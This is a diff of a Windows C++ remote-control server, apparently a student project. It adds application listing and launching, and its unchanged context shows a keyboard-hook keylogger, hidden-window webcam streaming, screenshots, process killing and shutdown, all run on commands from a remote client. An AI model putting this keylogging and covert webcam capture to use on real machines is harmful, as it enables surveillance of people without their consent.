@@ -14,15 +14,21 @@
 #include <gdiplus.h>
 #include <vfw.h>
 #include <tchar.h>
+#include <psapi.h> 
+#include <shellapi.h>
+#include <shlobj.h>
 
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "gdiplus.lib")
 #pragma comment(lib, "vfw32.lib")
+#pragma comment(lib, "psapi.lib")
+#pragma comment(lib, "shell32.lib")
+#pragma comment(lib, "advapi32.lib")
 
 using namespace std;
 using namespace Gdiplus;
 
-// Global Variables
+
 SOCKET serverSocket;
 SOCKET clientSocket;
 atomic<bool> isKeylogActive(false);
@@ -31,7 +37,7 @@ string keylogPath = "fileKeyLog.txt";
 HHOOK keyboardHook = NULL;
 HWND hCapture = NULL;
 
-// Function Prototypes
+
 void receiveSignal(string& s);
 void shutdown();
 void keylog();
@@ -46,7 +52,6 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
 void startKeyLogger();
 void stopKeyLogger();
 
-// String conversion helper compatible with UNICODE/ANSI
 static string toUtf8(const TCHAR* tstr) {
 #ifdef UNICODE
     int size = WideCharToMultiByte(CP_UTF8, 0, tstr, -1, nullptr, 0, nullptr, nullptr);
@@ -59,7 +64,6 @@ static string toUtf8(const TCHAR* tstr) {
 #endif
 }
 
-// Network Helper Functions
 void sendLine(const string& s) {
     string msg = s + "\n";
     send(clientSocket, msg.c_str(), msg.length(), 0);
@@ -109,8 +113,6 @@ std::string GetRealLocalIP() {
 void BroadcastServerInfo() {
     std::string realIP = GetRealLocalIP();
     if (realIP.empty()) return;
-
-    // Socket để broadcast
     SOCKET bcast = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
     if (bcast == INVALID_SOCKET) return;
 
@@ -125,7 +127,7 @@ void BroadcastServerInfo() {
 
     sockaddr_in dest = {};
     dest.sin_family = AF_INET;
-    dest.sin_port = htons(5656);  // Sửa từ 5657 -> 5656 để khớp với client
+    dest.sin_port = htons(5656);  
     dest.sin_addr.s_addr = INADDR_BROADCAST;
 
     char hostname[256];
@@ -135,14 +137,13 @@ void BroadcastServerInfo() {
     std::cout << "Broadcasting server info: " << message << std::endl;
 
     while (keepBroadcast) {
-        // Broadcast liên tục mỗi 2 giây
         sendto(bcast, message.c_str(), (int)message.length(), 0, (sockaddr*)&dest, sizeof(dest));
         std::this_thread::sleep_for(std::chrono::seconds(2));
     }
 
     closesocket(bcast);
 }
-// System Control Functions
+
 void shutdown() {
     system("shutdown /s /t 0");
 }
@@ -318,7 +319,41 @@ void takepic() {
     }
 }
 
-// Process Management
+string toLower(string s) {
+    for (char &c : s) c = tolower(c);
+    return s;
+}
+
+string FindShortcutRecursive(string folderPath, string targetName) {
+    string searchPath = folderPath + "\\*";
+    WIN32_FIND_DATAA data; 
+    HANDLE hFind = FindFirstFileA(searchPath.c_str(), &data);
+
+    if (hFind != INVALID_HANDLE_VALUE) {
+        do {
+            if (string(data.cFileName) == "." || string(data.cFileName) == "..") continue;
+
+            string fullPath = folderPath + "\\" + data.cFileName;
+
+            if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+                string found = FindShortcutRecursive(fullPath, targetName);
+                if (!found.empty()) {
+                    FindClose(hFind);
+                    return found;
+                }
+            } else {
+                string fileName = toLower(data.cFileName);
+                if (fileName.find(".lnk") != string::npos && fileName.find(targetName) != string::npos) {
+                    FindClose(hFind);
+                    return fullPath;
+                }
+            }
+        } while (FindNextFileA(hFind, &data)); 
+        FindClose(hFind);
+    }
+    return "";
+}
+
 void processManagement() {
     string ss;
     
@@ -358,13 +393,13 @@ void processManagement() {
                     HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
                     if (hProcess != NULL) {
                         if (TerminateProcess(hProcess, 0)) {
-                            sendLine("Da diet process");
+                            sendLine("Process killed successfully");
                         } else {
-                            sendLine("Loi");
+                            sendLine("Error: Unable to kill the process");
                         }
                         CloseHandle(hProcess);
                     } else {
-                        sendLine("Loi");
+                        sendLine("Error: Process not found");
                     }
                 } else if (ss == "QUIT") {
                     test = false;
@@ -376,18 +411,29 @@ void processManagement() {
                 receiveSignal(ss);
                 if (ss == "STARTID") {
                     string exeName = receiveLine();
-                    exeName += ".exe";
-                    
+
                     STARTUPINFOA si = {0};
                     PROCESS_INFORMATION pi = {0};
                     si.cb = sizeof(si);
-                    
-                    if (CreateProcessA(NULL, (LPSTR)exeName.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
-                        sendLine("Process da duoc bat");
-                        CloseHandle(pi.hProcess);
-                        CloseHandle(pi.hThread);
+
+                    char fullPath[MAX_PATH] = {0};
+                    DWORD found = SearchPathA(NULL, exeName.c_str(), ".exe", MAX_PATH, fullPath, NULL);
+                    if (found > 0 && found < MAX_PATH) {
+                        string cmd = string("\"") + fullPath + "\"";
+                        if (CreateProcessA(NULL, &cmd[0], NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+                            sendLine("Process started successfully");
+                            CloseHandle(pi.hProcess);
+                            CloseHandle(pi.hThread);
+                        } else {
+                            sendLine("Error: Unable to start the process");
+                        }
                     } else {
-                        sendLine("Loi");
+                        HINSTANCE h = ShellExecuteA(NULL, "open", exeName.c_str(), NULL, NULL, SW_SHOWNORMAL);
+                        if ((INT_PTR)h > 32) {
+                            sendLine("Process started successfully");
+                        } else {
+                            sendLine("Error: Unable to start the process");
+                        }
                     }
                 } else if (ss == "QUIT") {
                     test = false;
@@ -399,39 +445,108 @@ void processManagement() {
     }
 }
 
-// Application Management (processes with windows)
+struct AppInfo {
+    string title;
+    string exeName;
+    DWORD pid;
+    DWORD threads;
+};
+
+BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
+    vector<AppInfo>* pApps = (vector<AppInfo>*)lParam;
+    if (IsWindowVisible(hwnd) && GetWindowTextLength(hwnd) > 0) {
+        DWORD pid;
+        GetWindowThreadProcessId(hwnd, &pid);
+        if (pid == GetCurrentProcessId()) return TRUE;
+        
+        char title[1024];
+        GetWindowTextA(hwnd, title, sizeof(title));
+        
+        string exeName = "Unknown";
+        DWORD threads = 0;
+        
+        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
+        if (hProcess) {
+            char buffer[MAX_PATH];
+            if (GetModuleBaseNameA(hProcess, NULL, buffer, MAX_PATH)) {
+                exeName = buffer;
+            }
+            CloseHandle(hProcess);
+        }
+        
+        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if (hSnapshot != INVALID_HANDLE_VALUE) {
+            PROCESSENTRY32 pe32;
+            pe32.dwSize = sizeof(PROCESSENTRY32);
+            if (Process32First(hSnapshot, &pe32)) {
+                do {
+                    if (pe32.th32ProcessID == pid) {
+                        threads = pe32.cntThreads;
+                        break;
+                    }
+                } while (Process32Next(hSnapshot, &pe32));
+            }
+            CloseHandle(hSnapshot);
+        }
+        
+        if (GetParent(hwnd) == NULL) {
+            pApps->push_back({string(title), exeName, pid, threads});
+        }
+    }
+    return TRUE;
+}
+
+string GetAppPathFromRegistry(string appName) {
+    if (appName.find(".exe") == string::npos) appName += ".exe";
+    
+    const string subKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\" + appName;
+    char path[MAX_PATH] = { 0 };
+    DWORD bufferSize = MAX_PATH;
+    if (RegGetValueA(HKEY_CURRENT_USER, subKey.c_str(), NULL, RRF_RT_REG_SZ, NULL, path, &bufferSize) == ERROR_SUCCESS) {
+        return string(path);
+    }
+    bufferSize = MAX_PATH;
+    if (RegGetValueA(HKEY_LOCAL_MACHINE, subKey.c_str(), NULL, RRF_RT_REG_SZ, NULL, path, &bufferSize) == ERROR_SUCCESS) {
+        return string(path);
+    }
+    return ""; 
+}
+string FindAppInStartMenu(string appName) {
+    appName = toLower(appName);
+    char path[MAX_PATH];
+    string result = "";
+
+    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_PROGRAMS, NULL, 0, path))) {
+        result = FindShortcutRecursive(string(path), appName);
+        if (!result.empty()) return result;
+    }
+
+    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_COMMON_PROGRAMS, NULL, 0, path))) {
+        result = FindShortcutRecursive(string(path), appName);
+        if (!result.empty()) return result;
+    }
+
+    return "";
+}
+
 void applicationManagement() {
     string ss;
     
     while (true) {
         receiveSignal(ss);
-        
         if (ss == "XEM") {
-            HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-            if (hSnapshot != INVALID_HANDLE_VALUE) {
-                PROCESSENTRY32 pe32;
-                ZeroMemory(&pe32, sizeof(pe32));
-                pe32.dwSize = sizeof(PROCESSENTRY32);
-                
-                vector<PROCESSENTRY32> processes;
-                if (Process32First(hSnapshot, &pe32)) {
-                    do {
-                        processes.push_back(pe32);
-                    } while (Process32Next(hSnapshot, &pe32));
-                }
-                CloseHandle(hSnapshot);
-                
-                sendLine(to_string(processes.size()));
-                
-                for (const auto& proc : processes) {
-                    // Simple check - assume processes with main window title have a window
-                    // This is a simplified version to avoid lambda issues
-                    sendLine("ok");
-                    sendLine(toUtf8(proc.szExeFile));
-                    sendLine(to_string(proc.th32ProcessID));
-                    sendLine(to_string(proc.cntThreads));
-                }
+            vector<AppInfo> apps;
+            EnumWindows(EnumWindowsProc, (LPARAM)&apps);
+            
+            sendLine(to_string(apps.size()));
+            
+            for (const auto& app : apps) {
+                sendLine(app.title);       
+                sendLine(app.exeName);     
+                sendLine(to_string(app.pid));
+                sendLine(to_string(app.threads));
             }
+        
         } else if (ss == "KILL") {
             bool test = true;
             while (test) {
@@ -443,13 +558,13 @@ void applicationManagement() {
                     HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
                     if (hProcess != NULL) {
                         if (TerminateProcess(hProcess, 0)) {
-                            sendLine("Da diet chuong trinh");
+                            sendLine("Application closed successfully");
                         } else {
-                            sendLine("Loi");
+                            sendLine("Error: Unable to close the application");
                         }
                         CloseHandle(hProcess);
                     } else {
-                        sendLine("Khong tim thay chuong trinh");
+                        sendLine("Error: Application not found");
                     }
                 } else if (ss == "QUIT") {
                     test = false;
@@ -460,20 +575,37 @@ void applicationManagement() {
             while (test) {
                 receiveSignal(ss);
                 if (ss == "STARTID") {
-                    string exeName = receiveLine();
-                    exeName += ".exe";
-                    
-                    STARTUPINFOA si = {0};
-                    PROCESS_INFORMATION pi = {0};
-                    si.cb = sizeof(si);
-                    
-                    if (CreateProcessA(NULL, (LPSTR)exeName.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
-                        sendLine("Chuong trinh da duoc bat");
-                        CloseHandle(pi.hProcess);
-                        CloseHandle(pi.hThread);
-                    } else {
-                        sendLine("Loi");
+                    string inputName = receiveLine(); 
+                    string pathExec = "";
+
+                    pathExec = FindAppInStartMenu(inputName);
+
+                    if (pathExec.empty()) {
+                        char fullPath[MAX_PATH] = {0};
+                        string tempName = inputName;
+                        if (tempName.find(".exe") == string::npos) tempName += ".exe";
+
+                        if (SearchPathA(NULL, tempName.c_str(), NULL, MAX_PATH, fullPath, NULL) > 0) {
+                            pathExec = string(fullPath);
+                        }
                     }
+
+                    if (!pathExec.empty()) {
+                        HINSTANCE h = ShellExecuteA(NULL, "open", pathExec.c_str(), NULL, NULL, SW_SHOWNORMAL);
+                        if ((INT_PTR)h > 32) {
+                            sendLine("Application opened at: " + pathExec);
+                        } else {
+                            sendLine("Error: Found but unable to open: " + pathExec);
+                        }
+                    } else {
+                        HINSTANCE h = ShellExecuteA(NULL, "open", inputName.c_str(), NULL, NULL, SW_SHOWNORMAL);
+                        if ((INT_PTR)h > 32) {
+                             sendLine("Opened via Windows Run command");
+                        } else {
+                             sendLine("Error: Application not found with name '" + inputName + "'");
+                        }
+                    }
+
                 } else if (ss == "QUIT") {
                     test = false;
                 }
@@ -484,7 +616,6 @@ void applicationManagement() {
     }
 }
 
-// Helper function to get JPEG encoder CLSID
 int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
     UINT num = 0;
     UINT size = 0;
@@ -506,29 +637,19 @@ int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
     return -1;
 }
 
-// Frame callback for fast MJPG streaming (based on TestRTSP)
 static LRESULT CALLBACK FrameCallback(HWND hWnd, LPVIDEOHDR lpVH) {
     if (clientSocket == INVALID_SOCKET) return 0;
     if (!isRecording) return 0;
-
-    // Get frame size from camera
     DWORD dataSize = lpVH->dwBytesUsed;
-    
-    // Skip invalid frames
     if (dataSize < 1024) return 0;
-    
-    // 1. Gửi Magic Number (Header) để đánh dấu bắt đầu frame
     int magic = 0xFFFFFFFF; 
     send(clientSocket, (char*)&magic, sizeof(magic), 0);
-
-    // Send frame size (binary DWORD)
     int iResult = send(clientSocket, (char*)&dataSize, sizeof(dataSize), 0);
     if (iResult == SOCKET_ERROR) {
         isRecording = false;
         return 0;
     }
 
-    // Send frame data directly (MJPG compressed from camera)
     iResult = send(clientSocket, (char*)lpVH->lpData, dataSize, 0);
     if (iResult == SOCKET_ERROR) {
         isRecording = false;
@@ -537,7 +658,6 @@ static LRESULT CALLBACK FrameCallback(HWND hWnd, LPVIDEOHDR lpVH) {
     return (LRESULT)TRUE;
 }
 
-// Webcam Streaming - optimized with MJPG passthrough (no re-encoding)
 void webcam() {
     string cmd;
     bool streaming = false;
@@ -551,7 +671,6 @@ void webcam() {
                 sendLine("OK");
 
                 thread streamThread([&]() {
-                    // Create hidden capture window
                     hCapture = capCreateCaptureWindowA("WebcamCap",
                                                        WS_POPUP, 0, 0, 640, 480,
                                                        NULL, 0);
@@ -569,7 +688,6 @@ void webcam() {
                         return;
                     }
 
-                    // Force MJPG format for direct passthrough
                     BITMAPINFO bmpInfo = {0};
                     bmpInfo.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
                     bmpInfo.bmiHeader.biWidth = 640;
@@ -579,30 +697,23 @@ void webcam() {
                     bmpInfo.bmiHeader.biCompression = MAKEFOURCC('M', 'J', 'P', 'G');
                     bmpInfo.bmiHeader.biSizeImage = 640 * 480 * 3;
                     
-                    if (!SendMessage(hCapture, WM_CAP_SET_VIDEOFORMAT, sizeof(BITMAPINFOHEADER), (LPARAM)&bmpInfo)) {
-                        // Camera may not support MJPG, fallback to default
-                    }
+                    if (!SendMessage(hCapture, WM_CAP_SET_VIDEOFORMAT, sizeof(BITMAPINFOHEADER), (LPARAM)&bmpInfo)) {}
 
-                    // Optimize socket for streaming
                     char opt = 1;
                     setsockopt(clientSocket, IPPROTO_TCP, TCP_NODELAY, &opt, sizeof(opt));
-                    int sendBuff = 1024 * 1024; // 1MB send buffer
+                    int sendBuff = 1024 * 1024; 
                     setsockopt(clientSocket, SOL_SOCKET, SO_SNDBUF, (char*)&sendBuff, sizeof(sendBuff));
 
-                    // Set up frame callback for direct passthrough
                     SendMessage(hCapture, WM_CAP_SET_CALLBACK_FRAME, 0, (LPARAM)FrameCallback);
                     SendMessage(hCapture, WM_CAP_SET_PREVIEWRATE, 1, 0);
                     SendMessage(hCapture, WM_CAP_SET_PREVIEW, TRUE, 0);
 
                     isRecording = true;
 
-                    // Keep grabbing frames while streaming
                     while (streaming && isRecording) {
                         SendMessage(hCapture, WM_CAP_GRAB_FRAME_NOSTOP, 0, 0);
-                        // No sleep - run at maximum camera speed (typically 30fps)
                     }
 
-                    // Cleanup
                     isRecording = false;
                     
                     if (hCapture) {
@@ -632,7 +743,7 @@ void webcam() {
         }
     }
 }
-// Main Server Function
+
 int main() {
     WSADATA wsaData;
     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
@@ -640,7 +751,6 @@ int main() {
         return 1;
     }
     
-    // start broadcast thread so clients can discover this server
     std::thread(BroadcastServerInfo).detach();
 
     serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
@@ -702,7 +812,6 @@ int main() {
         }
     }
     
-    // stop broadcast loop and cleanup
     keepBroadcast = false;
     closesocket(clientSocket);
     closesocket(serverSocket);
